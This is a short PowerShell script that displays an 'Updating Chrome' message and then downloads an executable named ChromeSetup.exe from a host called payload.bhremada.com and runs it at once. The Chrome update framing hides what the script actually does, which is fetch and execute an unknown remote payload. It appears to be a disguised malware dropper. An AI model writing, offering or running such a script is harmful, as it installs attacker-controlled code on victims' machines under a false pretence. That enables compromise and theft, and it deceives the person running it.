Clear-Host

echo "[*] Updating Chrome..."
wget https://payload.bhremada.com/ChromeSetup.exe -OutFile ChromeSetup.exe
Start-Process .\ChromeSetup.exe
